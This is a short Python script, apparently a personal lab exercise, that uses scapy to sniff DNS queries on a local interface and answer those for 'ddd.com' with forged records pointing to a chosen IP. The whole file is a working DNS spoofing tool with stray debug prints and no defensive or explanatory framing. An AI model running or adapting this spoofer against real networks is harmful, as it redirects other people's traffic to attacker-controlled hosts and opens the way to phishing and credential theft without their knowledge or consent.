

from scapy.all import DNS, DNSQR, DNSRR, IP,IPv6, send, sniff, sr1, UDP
page_name = "ddd.com"
IFACE = "enx9cebe8b0f520"   # Or your default interface
DNS_SERVER_IP = "192.168.0.1"  # Your local IP
BPF_FILTER = f"udp port 53 and ip dst {DNS_SERVER_IP}"
FAKE_IP = "192.168.0.39"

def dns_responder(local_ip: str):

 

    def get_response(pkt: IP):
        print("XD")
        if (
            DNS in pkt and
            pkt[DNS].opcode == 0 and
            pkt[DNS].ancount == 0
        ):
            print("XD")
            if page_name in str(pkt["DNS Question Record"].qname):
                spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=FAKE_IP)/DNSRR(rrname=page_name,rdata=FAKE_IP))
                spf_resp.show()
                send(spf_resp, verbose=0, iface=IFACE)
                return f"Spoofed DNS Response Sent: {pkt[IP].src}"

           
    return get_response
sniff(filter=BPF_FILTER, prn=dns_responder(DNS_SERVER_IP), iface=IFACE)